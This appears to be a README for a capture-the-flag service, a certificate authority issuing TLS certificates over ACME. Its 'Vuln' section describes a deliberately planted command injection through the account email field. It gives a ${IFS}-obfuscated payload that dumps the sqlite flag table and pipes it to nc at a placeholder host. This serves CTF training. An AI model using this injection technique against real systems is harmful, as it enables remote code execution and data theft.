# CA certificate authority

## Description

CA service is a software infrastructure which allows clients to issue TLS certificates via ACME protocol and store private data after successfully passing the authentication using the private key and certificate issued by CA server.

## Features

1. Certificate issue via ACME protocol
2. Web service login with certificate and storing of private data

## Flags

Flags are private messages in sqlite database in table `data`.

## Vuln

In `newAccount` ACME method client sends account email matching `/^\w+\@\S+(.\S+){1,3}$/` regular expression.

CA signs CSR using `openssl` command like:

`openssl ca -config ca.conf -batch -create_serial -rand_serial -cert ssl/cert.pem -keyfile ssl/key.pem -subj /emailAddress=B4IxhkAgJ7eO@example.com/countryName=AE/commonName=B4IxhkAgJ7eO.com -in /tmp/OuIngdkten`

So, attacker can inject arbitrary command (matching the regexp) and execute arbitrary code. For example, account email can be:

`hack@ctf|sqlite3 data/ca.db "select data from data" | nc ip port;`, but space character are prohibited, so we can replace it with `${IFS}` and final exploit looks like:

`hack@ctf|sqlite3${IFS}data/ca.db${IFS}"select${IFS}data${IFS}from${IFS}data"${IFS}|${IFS}nc${IFS}ip${IFS}port;`

## Soft

1. sqlite3
2. Perl + Mojolicious web framework

## Deploy

```bash
$ docker-compose build --pull
$ ./init.sh
$ docker-compose up -d
```
